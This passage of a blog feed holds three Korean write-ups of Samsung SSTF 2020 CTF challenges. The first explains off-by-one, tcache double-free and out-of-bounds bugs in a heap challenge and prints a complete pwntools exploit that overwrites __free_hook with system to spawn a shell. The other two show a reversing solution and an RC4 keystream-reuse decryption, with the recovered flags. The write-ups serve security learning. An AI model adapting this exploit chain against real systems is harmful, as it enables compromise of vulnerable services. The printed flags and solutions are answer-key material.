    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image.png"></p><p>삼성에서 주최한 SSTF에 출전했습니다. 조금 늦은 감이 있지만 T-express 문제 풀이를 해볼까 합니다. T-express 바이너리를 실행하면 에버랜드 로고의 아스키 아트로 저희를 맞이해줍니다. 코로나 때문에 어디 놀러 가지도 못하고 있었는데 온라인으로 에버랜드에 가보네요. ㅎㅎ </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image1.png"></p><p>T-express 바이너리는 glibc-2.31와 함께 주어진 Heap문제입니다. glibc-2.31는 2020년 2월에 릴리즈 된 버전인데,  저는 T-express를 풀면서 이 버전의 tcache를 처음 접해봤습니다. 이런 저조차 어렵지 않게 풀만큼 크게 어렵지 않고 재밌게 풀 수 있는 문제입니다.</p><p>[취약점]</p><ol><li><p>Off-By-One</p></li><li><p>Double-Free</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="훑어보기"><a href="#훑어보기" class="headerlink" title="훑어보기"></a>훑어보기</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image2.png"></p><p>프로그램의 기능은 대충 아래와 같이 요약할 수 있습니다.</p><ol><li><p>티켓 구매</p><ul><li>One Ride 티켓 → 메모리 할당</li><li>One Day 티켓 → 메모리 할당</li></ul></li><li><p>보유 중인 티켓 보기</p></li><li><p>티켓 사용</p><ul><li>One Ride 티켓 → 할당 해제</li><li>One Day 티켓 → 활동 선택 → 모든 활동 사용 → 할당 해제</li></ul></li><li><p>종료</p></li></ol><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image3.png"></p><p>구매할 수 있는 티켓의 종류는 두 가지로 나뉩니다(One Ride Ticket / One Day Ticket). 두 티켓은 3가지 차이점이 있습니다.</p><ol><li>할당 크기<ul><li>One Ride → 0x18</li><li>One Day → 0x30</li></ul></li><li>티켓 타입<ul><li>One Ride → 1</li><li>One Day → 0</li></ul></li><li>해제 조건</li></ol><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image4.png"></p><p><code>0x55d222efe2a0</code> 에는 One Ride Ticket이, <code>0x55d222efe2c0</code> 에는 One Day Ticket이 할당돼있는 모습입니다. 하이라이트 된 부분을 보시면 <code>ticket_type</code>값이 저장된 것을 볼 수 있습니다.  여기서 집중해야 할 점은 <code>lastname</code> 바로 다음에 <code>ticket_type</code>이 존재한다는 것입니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image5.png"></p><p><code>lastname</code>은 티켓이 할당된 후 함수 <code>read_str()</code>으로 입력을 받습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image6.png"></p><p>함수 <code>read_str()</code>은 입력받은 string 끝에 NULL을 추가하는 루틴이 존재합니다. 만약 <code>lastname</code>에 입력받을 때 8byte를 꽉 채워 넣는다면 <code>ticket_type</code>의 값을 오염시킬 수 있겠죠?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image7.png"></p><p>One Ride Ticket의 <code>ticket_type</code>을 NULL(0x00)로 오염시킨 모습입니다. 그래서 이걸로 무얼 할 수 있느냐? <code>ticket_type</code>을 오염시켜 0으로 바꾸면 One Ride Ticket을 One Day Ticket인 것처럼 속일 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image8.png"></p><p>함수 <code>use_ticket()</code>의 일부입니다. <code>ticket_type</code>에 따라 분기문에서 실행되는 코드가 달라집니다. One Ride Ticket에는 존재하지 않는 <code>meal_ticket, safari_pass</code>등의 값을 조작하는 코드를 실행할 수 있고 이는 추가로 메모리 오염을 발생시킵니다.</p><h1 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h1><p>glibc-2.31 버전의 tcache는 double free를 검증하는 코드가 추가 됐습니다. 여기서 재밌는 점은 크기가 같은 tcache 끼리만 검증한다는 겁니다. 만약 청크의 size를 임의로 조작할 수 있는 방법이 있다면 같은 청크를 두 번 해제할 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image9.png"></p><p>One Ride Ticket의 <code>ticket_type</code>을 <code>0x00</code>으로 바꿔 함수 <code>use_ticket()</code>에서 One Day Ticket인 것처럼 사용할 수 있다고 설명했습니다. 그중 <code>meal_ticket</code>을 사용하면 다음 청크의 size값을 오염시킬 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image10.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image11.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image12.png"></p><p>위에서 설명한 대로 size값을 오염시킨 모습입니다. One Day Ticket을 size가 0x41일 때 한번, 0x21일 때 한번 할당 해제를 해주면 Double Free가 되겠죠?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image13.png"></p><p>짠! 같은 주소가 두 번 해제됩니다. 이제 원하는 주소에 chunk를 할당해 Arbitrary Write를 할 수 있습니다.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image14.png"></p><p>구매한 티켓은 <code>passes</code>라는 이름의 배열로 bss영역에 저장됩니다. 각 티켓에 해당하는 chunk의 주소를 저장하고 index를 사용해 접근합니다. 위 사진은 함수 <code>view_ticket()</code>의 일부입니다. 자세히 보시면 index를 검사하는 분기문에서 음수에 대한 예외처리를 하지 않은 것을 확인할 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image15.png"></p><p>만약 <code>passes</code> 보다 낮은 주소에 중요한 정보가 있다면 Out-Of-Bound로 출력시킬 수 있습니다. 그리고 배열 <code>passes</code>보다 조금 낮은 주소를 확인해 보면 <code>stderr@@GLIBC</code>가 있다는 걸 알 수 있습니다. </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image16.png"></p><p>함수 <code>view_ticket()</code>에 -4를 index로 입력한다면 <code>stderr@@GLIBC</code>를 통해 libc의 base address를 leak 할 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&#x27;t-express.sstf.site&#x27;, &#x27;1337&#x27;)</span>p = process(<span class="hljs-string">&#x27;./target&#x27;</span>)e = ELF(<span class="hljs-string">&#x27;./target&#x27;</span>)<span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment"># init</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;AAAA&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;CCCC&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;CCCC&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-comment"># leak libc</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;-4&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;|name |    &#x27;</span>)pad = u64(p.recv(<span class="hljs-number">4</span>)+ <span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;   &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+ <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)libc_base = leak<span class="hljs-number">-0x1ec643</span>log.info(hex(libc_base))free_hook = libc_base + <span class="hljs-number">0x1eeb28</span>log.info(hex(free_hook))system = libc_base + <span class="hljs-number">0x55410</span>log.info(hex(system))<span class="hljs-comment"># double free</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x20</span>):p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)gdb.attach(p)<span class="hljs-comment"># AW</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, p64(free_hook))p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, p64(system))p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image17.png"></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>off by one</tag>
      
      <tag>double free bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF CrackMe101</title>
    <link href="/2020/10/18/idioth/sstf-crackme101/"/>
    <url>/2020/10/18/idioth/sstf-crackme101/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-crackme101/image.png"></p><p>64bit elf 파일임을 알 수 있습니다. Ubuntu 20.04 64bit에서 실행을 해보겠습니다.</p><p><img src="/2020/10/18/idioth/sstf-crackme101/image1.png"></p><p>Password를 입력하고 정상적인 패스워드를 입력했을 시 플래그가 나오는 형식으로 생각할 수 있습니다.</p><p>Ghidra를 사용하여 crackme101이 어떤 식으로 구동되는지 확인해보도록 하겠습니다.</p><h1 id="crackme101-분석"><a href="#crackme101-분석" class="headerlink" title="crackme101 분석"></a>crackme101 분석</h1><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">size_t</span> sVar2;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  <span class="hljs-keyword">int</span> local_88;  <span class="hljs-keyword">char</span> local_78 [<span class="hljs-number">104</span>];  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password! : &quot;</span>);  __isoc99_scanf(&amp;DAT_0010206e,local_78);  sVar2 = <span class="hljs-built_in">strlen</span>(local_78);  iVar1 = (<span class="hljs-keyword">int</span>)sVar2;  getMaskedStr(local_78,local_78,local_78);  local_88 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> ((local_88 &lt; iVar1 &amp;&amp;         (<span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>[local_88] == local_78[(iVar1 - local_88) + <span class="hljs-number">-1</span>])))  &#123;    local_88 = local_88 + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">if</span> (local_88 != iVar1) &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Login Failed!&quot;</span>);    <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>      __stack_chk_fail();    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  &#125;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Successfully logged in!\nGood job!&quot;</span>);                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><p>입력된 패스워드는 <code>local_78</code>에 들어가게 되고 <code>iVar1</code>는 입력한 패스워드의 길이가 됩니다.</p><p><code>getMaskedStr</code> 함수에서 인자를 모두 <code>local_78</code>로 받아서 어떠한 작업을 수행한 후 “Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;” 문자열과 <code>ocal_78</code> 문자열을 뒷부분의 배열부터 <code>iVar1</code>의 크기만큼 비교합니다.</p><p><code>local_88</code>과 <code>iVar1</code>이 같아야 하려면 while 문의 조건인 각 문자열이 동일해야 하므로 <code>getMaskedStr</code> 함수를 통과한 <code>local_78</code>의 값이 어떠한 값인지 먼저 알아야 합니다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getMaskedStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1,<span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">size_t</span> sVar1;  <span class="hljs-keyword">int</span> local_18;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  local_18 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> (local_18 &lt; (<span class="hljs-keyword">int</span>)sVar1) &#123;    *(byte *)(param_2 + local_18) =         param_1[local_18] ^ <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk&#123;q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>[local_18];    local_18 = local_18 + <span class="hljs-number">1</span>;  &#125;  *(undefined *)(param_2 + (<span class="hljs-keyword">int</span>)sVar1) = <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>인자로 받은 param은 입력받은 패스워드 값이 될 것입니다.</p><p>문자열의 길이만큼 “u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9”문자열과 동일한 index끼리 xor 연산을 수행하는 것을 볼 수 있습니다.</p><p>따라서 패스워드 check가 어떠한 식으로 진행이 되는지 요약해보면</p><ol><li>패스워드를 입력을 받는다.</li><li><code>getMaskedStr</code> 함수를 통해 “u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9” 문자열과 동일한 인덱스끼리 xor 연산을 수행</li><li>수행한 결과를 뒤집어서 “Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;”과 맞는지 검사</li><li>맞으면 Correct</li></ol><p>그러면 저희가 복호화할 시나리오는</p><ol><li><p>최종적으로 나올 값은 “Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;”이므로 해당 문자열과 “u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9”를 뒤집은 문자열을 xor 연산</p></li><li><p>나온 문자열을 다시 뒤집음</p></li><li><p>Get Flag!!</p></li></ol><h1 id="Decode-Code"><a href="#Decode-Code" class="headerlink" title="Decode Code"></a>Decode Code</h1><pre><code class="hljs python">key1 = <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk&#123;q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>cmp_key = <span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>result1 = <span class="hljs-string">&quot;&quot;</span>revkey = key1[::<span class="hljs-number">-1</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key1)):    result1 += chr(ord(cmp_key[i]) ^ ord(revkey[i]))print(result1[::<span class="hljs-number">-1</span>])</code></pre><p><img src="/2020/10/18/idioth/sstf-crackme101/image2.png"></p><p>Flag : SCTF{Y0u_cR4ck3d_M3_up_t4k3_7h15_fL49}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF RC_four</title>
    <link href="/2020/10/18/idioth/sstf-rc-four/"/>
    <url>/2020/10/18/idioth/sstf-rc-four/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-rc-four/image.png"></p><p>압축을 풀면 challenge.py와 output.txt 파일을 볼 수 있습니다.</p><p><img src="/2020/10/18/idioth/sstf-rc-four/image1.png"></p><p>output.txt 파일에는 암호화된 것으로 추측되는 문자열이 2줄 존재합니다.</p><h1 id="challenge-py-분석"><a href="#challenge-py-분석" class="headerlink" title="challenge.py 분석"></a>challenge.py 분석</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> key, flag<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> hexlify<span class="hljs-comment">#RC4 encrypt function with &quot;key&quot; variable.</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">data</span>):</span><span class="hljs-comment">#check the key is long enough</span><span class="hljs-keyword">assert</span>(len(key) &gt; <span class="hljs-number">128</span>)<span class="hljs-comment">#make RC4 instance</span>cipher = ARC4.new(key)<span class="hljs-comment">#We don&#x27;t use the first 1024 bytes from the key stream.</span><span class="hljs-comment">#Actually this is not important for this challenge. Just ignore.</span>cipher.encrypt(<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">1024</span>)<span class="hljs-comment">#encrypt given data, and return it.</span><span class="hljs-keyword">return</span> cipher.encrypt(data)msg = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span><span class="hljs-keyword">print</span> (hexlify(encrypt(msg)).decode())<span class="hljs-keyword">print</span> (hexlify(encrypt(flag)).decode())</code></pre><p>challenge 파일을 해보면 arc4를 사용하여 암호화를 진행한 것을 알 수 있습니다.</p><p>output.txt의 첫 번째 줄은 msg를 암호화한 부분이고 두 번째 줄은 flag임을 알 수 있습니다.</p><p><a href="https://en.wikipedia.org/wiki/RC4">rc4 알고리즘</a>은 스트림 암호로 key 값을 사용하여 셔플링을 통해 키 스트림 바이트를 생성한 후 해당 키 스트림과 xor 연산을 통해 암호화를 진행합니다.</p><p>key 값을 사용하여 생성된 key stream과 문자열을 xor 연산하여 최종 암호문이 나오는 것을 활용하면 key 값을 알지 못해도 flag 암호문을 복호화할 수 있습니다.</p><p>key stream ^ 문자열 = 암호문이므로 암호문 ^ 문자열을 수행하면 key stream을 알 수 있고 해당 key stream과 flag 암호문을 xor 연산을 수행하면 flag 값을 얻을 수 있습니다.</p><h1 id="Decrypt-Code"><a href="#Decrypt-Code" class="headerlink" title="Decrypt Code"></a>Decrypt Code</h1><pre><code class="hljs python">text = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span>result = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xf8</span>]stream = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text))]dec_flag = [<span class="hljs-number">0x62</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text)):    stream[i] = str(int(ord(text[i]) ^ result[i]))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(dec_flag)):    flag += str(chr(int(stream[i]) ^ dec_flag[i]))print(flag)</code></pre><p><img src="/2020/10/18/idioth/sstf-rc-four/image2.png"></p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>crypto</tag>
      
      <tag>rc4</tag>
      
      <tag>decrypt</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
